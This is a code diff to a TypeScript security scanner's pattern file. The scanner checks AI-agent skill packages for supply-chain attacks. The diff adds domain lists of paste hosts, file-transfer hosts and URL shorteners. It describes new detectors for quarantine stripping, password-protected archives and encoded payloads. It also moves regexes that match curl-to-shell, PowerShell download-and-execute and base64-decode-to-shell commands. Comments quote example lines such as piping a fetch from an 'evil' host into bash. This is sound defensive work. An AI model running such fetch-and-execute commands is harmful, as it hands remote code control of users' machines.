@@ -20,6 +20,43 @@ export const DEFAULT_ALLOWED_DOMAINS = [
   'typescriptlang.org',
 ]
 
+// SMI-6033 Wave 3 (Gap 4 fix): paste/snippet-host domains, split into TWO
+// reputation tiers (the shipped PASTE_HOST_DOMAINS was a single flat list
+// that wrongly conflated transfer.sh/file.io with glot.io/pastebin.com — see
+// SecurityScanner.paste-host.ts for detection logic).
+// ANON_PASTE_HOSTS (+ URL_SHORTENER_DOMAINS below): durable anonymous hosts
+// with no legitimate anonymous-fetch use case — standalone-critical only
+// with EXECUTION evidence (piped to an interpreter, or its fetch destination
+// is later executed/chmod'd/sourced elsewhere); fetched-but-not-executed or
+// merely linked stays at the existing scanUrls() url:medium.
+export const ANON_PASTE_HOSTS = [
+  'glot.io',
+  'pastebin.com',
+  'paste.ee',
+  'hastebin.com',
+  'ix.io',
+  '0x0.st',
+  'dpaste.org',
+  'dpaste.com',
+  'ghostbin.com',
+  'paste.rs',
+  'controlc.com',
+  'rentry.co',
+  'paste.gg',
+  'justpaste.it',
+]
+
+// TRANSIENT_TRANSFER_HOSTS: ephemeral file-transfer hosts with a genuine
+// debugging/incident-response use case. Always medium/co-signal-eligible,
+// NEVER standalone-critical, regardless of execution evidence — `curl
+// file.io/x | bash` alone staying sub-threshold is deliberate, not a gap.
+export const TRANSIENT_TRANSFER_HOSTS = ['transfer.sh', 'file.io', 'tmpfiles.org', 'temp.sh']
+
+// URL-shorteners join ANON_PASTE_HOSTS's critical rule, but ONLY when
+// execution-correlated — a shortened URL piped to a shell has no legitimate
+// install shape (a bare shortened link stays at url:medium like any tier here).
+export const URL_SHORTENER_DOMAINS = ['bit.ly', 'tinyurl.com', 't.co', 'is.gd']
+
 // Sensitive file path patterns
 // SMI-4396 Wave 2: bare-keyword variants (credentials, secrets?, password) tightened
 // to require assignment/path/file-extension context. Without this tuning,
@@ -121,8 +158,45 @@ export { EVIDENCE_TYPE_BY_PATTERN } from './patterns.jailbreak.evidence.js'
  * cross-line matches now possible where none fired before), plus SSRF_
  * INSTRUCTION_PATTERNS word-boundary narrowing (some previously-firing
  * substring FPs, e.g. "budget to localhost", no longer match).
+ *
+ * Bumped to `2026-08-14.1`: SMI-6033 Wave 2 added four new standalone
+ * detector/finding-type categories that did not exist under the prior
+ * version — `gatekeeper_bypass` (xattr quarantine-attribute stripping,
+ * SecurityScanner.compound.ts), `archive_evasion` (password-protected
+ * archive extraction, SecurityScanner.archive.ts), `paste_host_fetch`
+ * (anonymous paste/snippet-host fetch-and-execute, SecurityScanner.paste-
+ * host.ts), and `encoded_payload` (base64 decode-and-recursive-rescan,
+ * SecurityScanner.encoding.ts). Each is exactly the
+ * previously-clean-content-now-fires scenario the ruleset-version gate
+ * exists for: a skill whose bundled content or SKILL.md legitimately
+ * contained an xattr troubleshooting snippet, a password-protected archive
+ * step, a paste-host link, or a base64 blob scanned clean before this wave
+ * and can now legitimately surface a new finding (up to standalone-critical
+ * for the correlated/inline-secret/execution-correlated forms of the first
+ * three) purely because new detection exists, not because the content
+ * changed. A stored acceptance-baseline entry produced under
+ * `2026-07-29.1` predates all four categories and is not comparable —
+ * this bump forces the local MCP audit baseline to re-scan rather than
+ * silently reuse it.
+ *
+ * Bumped to `2026-08-15.1`: SMI-6033 Wave 4 added a fifth standalone
+ * detector/finding-type category, `decoy_misdirection` (a fetch target
+ * whose domain doesn't match a vendor brand/authority claim made nearby in
+ * the skill's own prose, SecurityScanner.decoy.ts), plus the
+ * `IMPERATIVE_FETCH_EXEC_PROSE` pattern set (patterns.exec.ts — free-text
+ * "download the installer from thisurl.com and run it" now emits a
+ * `code_execution` medium finding where it previously matched nothing) and
+ * replaced `CODE_EXECUTION_CO_OCCURRENCE` with `CO_SIGNAL_MIN_SEVERITY`
+ * (SecurityScanner.exec.ts), whose new two-distinct-medium-signal path can
+ * escalate a `code_execution` finding to critical on content that only ever
+ * produced advisory-tier findings before. All three are the
+ * previously-clean-content-now-fires scenario this gate exists for. Scope
+ * note (unchanged from Wave 3): this forces re-evaluation of the local MCP
+ * audit baseline only (patterns.ts:100-125,
+ * packages/mcp-server/src/audit/security-audit.ts:219-222); the edge indexer
+ * never reads this constant, which is why it has no edge counterpart.
  */
-export const SCANNER_RULESET_VERSION = '2026-07-29.1' as const
+export const SCANNER_RULESET_VERSION = '2026-08-15.1' as const
 
 // Suspicious patterns that might indicate malicious intent
 export const SUSPICIOUS_PATTERNS = [
@@ -139,46 +213,12 @@ export const SUSPICIOUS_PATTERNS = [
   /wget\s+.*\|\s*(bash|sh)/i,
 ]
 
-/**
- * SMI-5359 Wave 4.2: Remote-fetch-to-interpreter ("code_execution") patterns.
- *
- * These detect a skill instructing the agent to download remote content and pipe
- * it straight into a shell/interpreter — the canonical "curl | bash" supply-chain
- * primitive and its PowerShell / process-substitution / decode-then-exec variants.
- *
- * Scope discipline (SMI-4396): every pattern requires BOTH a fetch verb
- * (curl/wget/irm/iwr/Invoke-WebRequest/Net.WebClient) AND an execution sink
- * (| sh, <(...), eval $(...), iex, -EncodedCommand). A bare package install
- * (npm/pip/brew/cargo/apt install) matches none of these. Quantifiers are bounded
- * and exclude the pipe / newline so there is no catastrophic backtracking.
- *
- * SMI-5359 Wave 4.2c retune (read-only prod sim FP): the curl/wget fetch patterns
- * additionally require a CONCRETE remote target (http(s):// or a `host.tld` domain)
- * between the verb and the sink. This kills the false positive where a code-review /
- * security-review skill documents the GENERIC pattern in prose with a placeholder
- * ("curl … | sh") — no target -> no match — while a real "curl https://evil/x | bash"
- * (which always names a target) still fires.
- */
-export const CODE_EXECUTION_PATTERNS = [
-  // curl|wget <target> | [sudo] <interpreter>  (fetch piped to a shell or scripting interpreter)
-  /(?:curl|wget)\b[^\n|]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})[^\n|]{0,150}?\|\s*(?:sudo\s+(?:-[A-Za-z]+\s+)?)?(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
-  // process substitution: bash/sh/zsh/source/. <(curl|wget <target> ...)
-  /(?:^|[\s;&])(?:source|\.|ba?sh|zsh|exec)\s+<\(\s*(?:curl|wget)\b[^\n)]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})/i,
-  // command substitution into eval or `sh -c`: eval "$(curl <target>...)", bash -c "`wget <target>...`"
-  /(?:\beval\b|(?:ba|z)?sh\s+-c)\s+["']?[$`]\(?\s*(?:curl|wget)\b[^\n)]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})/i,
-  // PowerShell download-and-execute: iex(irm ...), Invoke-Expression(... DownloadString/Invoke-WebRequest)
-  /\b(?:iex|invoke-expression)\b[^\n]{0,100}?(?:\birm\b|\biwr\b|invoke-webrequest|invoke-restmethod|downloadstring|net\.webclient)/i,
-  // PowerShell encoded command (base64 payload handed to the interpreter)
-  /\bpowershell\b[^\n]{0,60}?\s-e(?:nc|ncodedcommand)?\b\s*[A-Za-z0-9+/=]{16,}/i,
-  // decode-then-exec: ... base64 -d ... | <interpreter> (SMI-5359 retro NIT: da sink, matches the curl pattern)
-  /\bbase64\s+(?:-d|--decode|-D)\b[^\n|]{0,60}?\|\s*(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
-  // SMI-5424 FN-1: chained / redirect download-then-execute (curl URL -o /tmp/x && bash /tmp/x)
-  /(?:curl|wget)\b[^\n]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})[^\n]{0,150}?(?:&&|;)\s*(?:sudo\s+(?:-[A-Za-z]+\s+)?)?(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
-  // SMI-5424 FN-2: npx executing a REMOTE source (URL or github:), never a local package (npx tsc is clean)
-  /\bnpx\s+(?:--yes\s+|-y\s+)?(?:https?:\/\/\S+|github:\S+)/i,
-  // SMI-5424 FN-4: node/python/deno/bun inline-eval (-e/-c) with a dangerous payload
-  /\b(?:node|python[23]?|deno|bun)\s+(?:-e|-c|--eval|--exec)\s+['"][^'"]{0,200}?(?:require\(|child_process|fetch\(|\bexec\b|eval\(|base64|urllib|os\.system|subprocess)/i,
-]
+// SMI-6033 Wave 4 (Gap 1): CODE_EXECUTION_PATTERNS moved to patterns.exec.ts
+// alongside the new IMPERATIVE_FETCH_EXEC_PROSE sibling array (this file was
+// already at the repo's 500-line gate with zero headroom). Re-exported here
+// unchanged — same load-bearing re-export convention as the two
+// patterns.jailbreak* re-exports above; do not remove.
+export { CODE_EXECUTION_PATTERNS, IMPERATIVE_FETCH_EXEC_PROSE } from './patterns.exec.js'
 
 // SMI-685: Social engineering attempt patterns
 export const SOCIAL_ENGINEERING_PATTERNS = [
